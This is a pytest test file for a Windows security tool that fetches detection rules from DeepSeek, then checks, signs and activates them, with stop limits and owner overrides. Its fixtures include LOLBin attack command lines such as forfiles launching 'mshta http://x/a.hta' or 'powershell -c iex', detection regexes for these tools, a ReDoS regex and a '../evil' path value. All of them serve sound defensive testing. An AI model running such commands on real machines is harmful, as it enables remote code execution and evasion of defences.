"""DeepSeek rules on Windows: automatic fetching, every local check, signed activation, stop limits, CLI.

Windows'ta DeepSeek kuralları: otomatik çekme, her yerel denetim, imzalı etkinleştirme, durdurma sınırları, komut satırı.
"""
import io
import json

import pytest

from satsuma_win import ai_rules, machine_key
from satsuma_win.ai_rules import AiRules
from satsuma_win.guard import deepseek_command
from satsuma_win.rules import Engine

KEY = 'sk-test-0123456789abcdef0123456789'
reverse = lambda b: b[::-1]


def package(rule_id='SATSUMA-AI-WIN-FORFILES-PROXY', **detection_changes):
    detection = {
        'id': rule_id, 'name': 'forfiles ile vekil çalıştırma', 'severity': 'high', 'classification': 'suspicious',
        'confidence': 'medium', 'mitre': {'tactic': 'Defense Evasion', 'technique': 'T1202'},
        'base_match': {'source': 'win_proc', 'exe_regex': ['\\\\forfiles\\.exe$'],
                       'cmd_regex': ['\\s/c\\s+"?[^"]{0,200}\\b(powershell|mshta|rundll32|regsvr32)\\b']},
        'actions': ['record', 'evidence', 'correlation_request'], 'schema_version': 1,
        'implementation_status': 'CURRENT_TELEMETRY', 'requires': ['sysmon.1'], 'proof_level': 'PUBLIC_RESEARCH',
        'false_positives': ['Bakım betikleri.'], **detection_changes}
    ff = 'C:\\Windows\\System32\\forfiles.exe'
    return {'rule_id': rule_id, 'attack_type': 'lolbin_proxy_execution', 'detection': detection,
            'test_cases': {
                'positive': [{'id': 1, 'Image': ff, 'CommandLine': 'forfiles /p C:\\Windows /m notepad.exe /c "powershell -c iex"'},
                             {'id': 1, 'Image': ff, 'CommandLine': 'forfiles.exe /c "mshta http://x/a.hta"'}],
                'negative': [{'id': 1, 'Image': ff, 'CommandLine': 'forfiles /p C:\\logs /d -30 /c "cmd /c del @file"'},
                             {'id': 1, 'Image': 'C:\\Windows\\System32\\cmd.exe', 'CommandLine': 'cmd /c powershell -c dir'}]},
            'response_proposal': {'requested_action': 'process_kill'}}


class Http:
    """DeepSeek's answers, one per request; records every prompt. Her istek için bir yanıt."""

    def __init__(self, *answers):
        self.answers, self.prompts = list(answers), []

    def __call__(self, url, payload, api_key, timeout):
        self.prompts.append(payload['messages'][1]['content'])
        answer = self.answers.pop(0) if self.answers else package('SATSUMA-AI-WIN-X%d' % len(self.prompts))
        if isinstance(answer, Exception):
            raise answer
        return {'choices': [{'message': {'content': json.dumps(answer)}}]}


class Clock:
    def __init__(self):
        self.now = 1_800_000_000.0

    def __call__(self):
        return self.now


def make(tmp_path, *answers, linear_check=lambda pattern, flags: True, key=True, clock=None):
    mkey, _ = machine_key.ensure(tmp_path, protect=reverse, unprotect=reverse)
    records = []
    clock = clock or Clock()
    ai = AiRules(tmp_path, mkey, lambda kind, **f: records.append((kind, f)) or f, clock=clock, monotonic=clock,
                 http=Http(*answers), protect=reverse, unprotect=reverse, threads=False, linear_check=linear_check,
                 live=lambda pid: None)
    if key:
        ai_rules.write_request(tmp_path, 'set_key', key=KEY)
    return ai, records, mkey


def kinds(records):
    return [k for k, _ in records]


def test_the_key_is_kept_encrypted_and_never_recorded(tmp_path):
    ai, records, _ = make(tmp_path, key=True)
    ai.process_requests()
    stored = (tmp_path / 'deepseek' / 'key.dpapi').read_bytes()
    assert stored != KEY.encode() and ai.api_key() == KEY
    assert not list((tmp_path / 'deepseek' / 'requests').glob('*.json'))
    assert KEY not in json.dumps(records)


def test_a_passing_rule_is_fetched_signed_and_live_without_approval(tmp_path):
    ai, records, _ = make(tmp_path, package())
    assert ai.tick() is True
    assert 'deepseek_rule_activated' in kinds(records)
    envelope = json.loads((tmp_path / 'deepseek' / 'active' / 'SATSUMA-AI-WIN-FORFILES-PROXY.json').read_text())
    assert envelope['approval']['origin'] == 'automatic' and envelope['signature']
    engine = Engine(extra=ai.active_rules, own_pid=1)
    event = {'id': 1, 'record': 1, 'ProcessId': '900', 'Image': 'C:\\Windows\\System32\\forfiles.exe',
             'CommandLine': 'forfiles /c "regsvr32 /s x.dll"', 'ParentImage': 'C:\\Windows\\explorer.exe'}
    found = [f for f in engine.match(event) if f['rule_id'] == 'SATSUMA-AI-WIN-FORFILES-PROXY']
    assert found and found[0]['origin'] == 'deepseek' and found[0]['stop'] is True
    kind = [f for k, f in records if k == 'deepseek_rule_activated'][0]['attack_type']
    assert ai.status()['active'] == 1 and ai.status()['by_type'][kind] == 1


def test_the_prompt_names_the_type_the_windows_fields_and_the_existing_rules(tmp_path):
    ai, records, _ = make(tmp_path, package())
    ai.existing = lambda: [{'id': 'SATSUMA-WIN-004', 'base_match': {'source': 'win_proc', 'exe_regex': ['mshta']}}]
    ai.tick()
    text = ai.http.prompts[0]
    assert 'WINDOWS' in text and 'SATSUMA-AI-WIN-' in text and 'win_registry' in text and 'SATSUMA-WIN-004' in text
    assert KEY not in text


def test_every_type_is_filled_up_to_ten_rules_fewest_first(tmp_path):
    ai, _, _ = make(tmp_path, key=False)
    counts = {kind: ai_rules.MAX_PER_TYPE for kind in ai_rules.ATTACK_TYPES}
    assert ai._next_type(counts, 0) is None
    # Past the target (10) a type keeps filling up to MAX_PER_TYPE, at most AFTER_TARGET_PER_DAY a day.
    counts = {kind: ai_rules.TARGET_PER_TYPE for kind in ai_rules.ATTACK_TYPES}
    kind = ai._next_type(counts, 0)
    assert kind is not None
    ai.state['types'][kind] = {'day': '1970-01-01', 'today': ai_rules.AFTER_TARGET_PER_DAY}
    assert ai._next_type(counts, 0) != kind
    counts['persistence'], counts['discovery'] = 9, 3
    assert ai._next_type(counts, 0) == 'discovery'
    assert len(ai_rules.ATTACK_TYPES) >= 18


@pytest.mark.parametrize('broken, reason', [
    (lambda p: p['test_cases']['positive'].append({'id': 1, 'Image': 'C:\\x\\forfiles.exe', 'CommandLine': 'forfiles /?'}),
     'test_positive_2_missed'),
    (lambda p: p['detection'].update(classification='indicator'), 'classification_must_stop'),
    (lambda p: p['detection'].update(actions=['record', 'ticket']), 'actions_must_be'),
    (lambda p: p['detection'].update(id='SATSUMA-WIN-999'), 'rule_id_must_be'),
    (lambda p: p['detection']['base_match'].update(source='sys_proc'), 'not a Windows source'),
    (lambda p: p['detection'].update(base_match={'source': 'win_proc', 'cmd_contains': ['powershell']}),
     'matches_satsuma_own_command'),
    (lambda p: p['detection'].update(base_match={'source': 'win_dns', 'target_regex': ['pastebin\\.com$']}),
     'matches_everyday_event'),
    (lambda p: p['test_cases'].update(negative=[]), 'test_cases_negative'),
])
def test_a_rule_failing_any_check_is_refused_and_asked_again_with_the_reasons(tmp_path, broken, reason):
    bad = package()
    broken(bad)
    ai, records, _ = make(tmp_path, bad, package('SATSUMA-AI-WIN-SECOND'))
    ai.tick()
    refused = [f for k, f in records if k == 'deepseek_rule_refused']
    assert refused and any(reason in r for r in refused[0]['reasons']), refused
    assert not list((tmp_path / 'deepseek' / 'active').glob('*.json')) if (tmp_path / 'deepseek' / 'active').exists() else True
    ai.next_at = 0
    ai.tick()
    assert 'Your previous reply was refused' in ai.http.prompts[1]


def test_a_rule_repeating_an_existing_one_is_refused(tmp_path):
    ai, records, _ = make(tmp_path, package(), package('SATSUMA-AI-WIN-OTHER'))
    ai.tick()
    ai.next_at = 0
    ai.tick()
    reasons = [f['reasons'] for k, f in records if k == 'deepseek_rule_refused'][0]
    assert 'same_base_match_as_an_existing_rule' in reasons


def test_a_regex_that_can_hang_is_refused_by_the_real_linux_probe(tmp_path):
    bad = package()
    bad['detection']['base_match']['cmd_regex'] = ['^(a+)+$']
    errors, compiled = ai_rules.check(bad)
    assert compiled is None and any(e.startswith('regex_not_linear') for e in errors)
    good, _ = ai_rules.check(package())
    assert good == []


def test_a_type_refused_three_times_waits_and_errors_wait_too(tmp_path):
    bad = package()
    bad['detection']['classification'] = 'indicator'
    clock = Clock()
    ai, records, _ = make(tmp_path, bad, bad, bad, clock=clock)
    for _ in range(3):
        ai.next_at = 0
        ai.tick()
    asked = [f for k, f in records if k == 'deepseek_rule_refused'][0]['attack_type']
    assert ai.state['types'][asked]['wait_until'] > clock.now
    from satsuma.deepseek_client import DeepSeekError
    ai2, records2, _ = make(tmp_path / 'b', DeepSeekError('quota_exceeded'), clock=clock)
    ai2.tick()
    assert ai2.state['wait_until'] == clock.now + ai_rules.QUOTA_WAIT and 'deepseek_request_failed' in kinds(records2)
    ai2.http.answers.append(package())
    ai2.next_at = 0
    ai2.tick()
    assert 'deepseek_rule_activated' not in kinds(records2), 'waits after a quota answer'


def test_without_a_key_nothing_is_asked(tmp_path):
    ai, records, _ = make(tmp_path, package(), key=False)
    assert ai.tick() is False and ai.http.prompts == []


def test_a_rule_file_changed_by_hand_is_never_loaded(tmp_path):
    ai, records, _ = make(tmp_path, package())
    ai.tick()
    path = tmp_path / 'deepseek' / 'active' / 'SATSUMA-AI-WIN-FORFILES-PROXY.json'
    envelope = json.loads(path.read_text())
    envelope['package']['detection']['base_match']['cmd_regex'] = ['.']
    path.write_text(json.dumps(envelope))
    assert ai.active_rules() == [] and ai.load_errors[0]['error'] == 'signature_does_not_verify'
    (tmp_path / 'deepseek' / 'active' / 'SATSUMA-AI-WIN-HAND.json').write_text(json.dumps(
        {'package': package('SATSUMA-AI-WIN-HAND'), 'approval': {}, 'signature': 'AAAA'}))
    assert ai.active_rules() == []


def test_stop_limits_protected_targets_and_the_live_command(tmp_path):
    ai, records, _ = make(tmp_path, package())
    ai.tick()
    engine = Engine(extra=ai.active_rules, own_pid=1)
    compiled = engine.compiled('SATSUMA-AI-WIN-FORFILES-PROXY')
    ff = 'C:\\Windows\\System32\\forfiles.exe'
    finding = {'rule_id': 'SATSUMA-AI-WIN-FORFILES-PROXY', 'source': 'win_proc', 'pid': '900', 'image': ff}
    live = {'Image': ff, 'CommandLine': 'forfiles /c "powershell -c iex"'}
    ai.live = lambda pid: live
    assert ai.stop_block(finding, compiled) is None
    assert ai.stop_block({**finding, 'image': 'C:\\Windows\\explorer.exe'}, compiled) == 'ai_rule_protected_target'
    assert ai.stop_block({**finding, 'image': 'C:\\Program Files\\Satsuma\\x.exe'}, compiled) == 'ai_rule_protected_target'
    assert ai.stop_block({**finding, 'image': 'C:\\Windows\\System32\\svchost.exe'}, compiled) == 'ai_rule_protected_target'
    fake = 'C:\\Users\\ali\\AppData\\Local\\Temp\\explorer.exe'
    ai.live = lambda pid: {'Image': fake, 'CommandLine': 'forfiles /c "powershell -c iex"'}
    assert ai.stop_block({**finding, 'image': fake}, compiled) != 'ai_rule_protected_target'
    ai.live = lambda pid: live
    ai.live = lambda pid: {'Image': ff, 'CommandLine': 'forfiles /?'}
    assert ai.stop_block(finding, compiled) == 'ai_rule_live_command_does_not_match'
    ai.live = lambda pid: None
    assert ai.stop_block(finding, compiled) == 'ai_rule_process_changed'
    ai.live = lambda pid: live
    for _ in range(ai_rules.STOP_LIMIT):
        assert ai.stop_block(finding, compiled) is None
        ai.count_stop(finding)
    assert ai.stop_block(finding, compiled) == 'ai_rule_stop_limit'
    assert 'deepseek_rule_stop_limit' in kinds(records)
    assert ai.stop_block({**finding, 'rule_id': 'SATSUMA-WIN-120'}, compiled) is None   # bundled rules: no limit


def test_the_owner_can_set_report_only_disable_and_remove(tmp_path):
    ai, records, _ = make(tmp_path, package())
    ai.tick()
    rid = 'SATSUMA-AI-WIN-FORFILES-PROXY'
    ai_rules.write_request(tmp_path, 'override', rule_id=rid, mode='report')
    assert ai.tick() is True
    assert ai.stop_block({'rule_id': rid, 'image': 'C:\\x.exe', 'pid': 1}) == 'ai_rule_owner_report'
    ai_rules.write_request(tmp_path, 'override', rule_id=rid, mode='disabled')
    ai.tick()
    assert ai.active_rules() == []
    ai_rules.write_request(tmp_path, 'override', rule_id=rid, mode='enabled')
    ai.tick()
    assert [name for name, _ in ai.active_rules()] == [rid + '.json']
    ai_rules.write_request(tmp_path, 'remove', rule_id=rid)
    ai.tick()
    assert ai.active_rules() == []
    (tmp_path / 'deepseek' / 'overrides.json').write_text(json.dumps({'rows': {rid: 'disabled'}, 'signature': 'AAAA'}))
    assert ai.overrides() == {}, 'an override written by hand counts for nothing'


def test_the_command_line_only_writes_requests(tmp_path):
    lines = []
    assert deepseek_command(['--deepseek-key'], tmp_path, read_key=lambda: KEY + '\n', out=lines.append) == 0
    assert deepseek_command(['--deepseek-key'], tmp_path, read_key=lambda: 'short', out=lines.append) == 2
    assert deepseek_command(['--rule-disable', 'SATSUMA-AI-WIN-X1'], tmp_path, out=lines.append) == 0
    assert deepseek_command(['--rule-disable', '../evil'], tmp_path, out=lines.append) == 2
    assert deepseek_command(['--deepseek-now'], tmp_path, out=lines.append) == 0
    requests = sorted((tmp_path / 'deepseek' / 'requests').glob('*.json'))
    assert [json.loads(p.read_text())['type'] for p in requests] == ['set_key', 'override', 'fetch_now']
    assert KEY not in ' '.join(lines)
    assert deepseek_command(['--rules'], tmp_path, out=lines.append) == 0
    assert json.loads(lines[-1])['bundled']['rules'] >= 60


def test_the_frozen_regex_probe_answers_like_the_linux_probe():
    spec = json.dumps({'pattern': 'abc', 'flags': 2, 'units': ['ab', 'a'], 'size': 4096, 'limit': 0.05})
    out = io.StringIO()
    assert ai_rules.regex_probe_main(io.StringIO(spec), out) == 0 and out.getvalue().strip() == '1'


def test_the_guard_fetches_reloads_and_stops_through_the_limits(tmp_path):
    from satsuma_win.guard import Guard
    from test_windows_sysmon import Events, Memory
    from types import SimpleNamespace
    memory = Memory()
    holder = {}

    def factory(directory, key, record, existing=lambda: ()):
        ai = AiRules(directory, key, record, http=Http(package()), protect=reverse, unprotect=reverse, threads=False,
                     linear_check=lambda p, f: True, existing=existing,
                     live=lambda pid: {'Image': 'C:\\Windows\\System32\\forfiles.exe',
                                       'CommandLine': 'forfiles /c "powershell -c iex"'})
        holder['ai'] = ai
        return ai
    event = {'id': 1, 'record': 50, 'ProcessId': '900', 'Image': 'C:\\Windows\\System32\\forfiles.exe',
             'CommandLine': 'forfiles /c "powershell -c iex"', 'ParentImage': 'C:\\Windows\\explorer.exe',
             'ParentProcessId': '600'}
    ok = lambda argv, **kw: SimpleNamespace(returncode=0, stdout='{}', stderr='')
    g = Guard(runner=ok, read=lambda: [], directory=tmp_path, echo=lambda *_: None,
              memory_factory=lambda record, directory, key: memory, sysmon_factory=lambda: Events([[], [event]]),
              package_manager_running=lambda: False, ai_factory=factory)
    g.start()
    # Owner's request 2026-11-25: requests carry the Satsuma administrator password's proof.
    from satsuma_win import owner_password
    g.gate = owner_password.Gate(tmp_path, reverse, reverse, g.record)
    owner_password.prepare(tmp_path, 'parola-12345')
    g.gate.settle()
    g.ai.gate = g.gate
    ai_rules.write_request(tmp_path, 'set_key', password='parola-12345', key=KEY)
    g.check_ai()
    assert g.rules.compiled('SATSUMA-AI-WIN-FORFILES-PROXY') is not None
    g.check_sysmon()
    assert memory.reader.stopped == [(900, 'C:\\Windows\\System32\\forfiles.exe')]
    assert holder['ai'].stops['SATSUMA-AI-WIN-FORFILES-PROXY']
    text = (tmp_path / 'events.jsonl').read_text()
    assert '"rules_reloaded"' in text and '"deepseek_rule_activated"' in text and KEY not in text
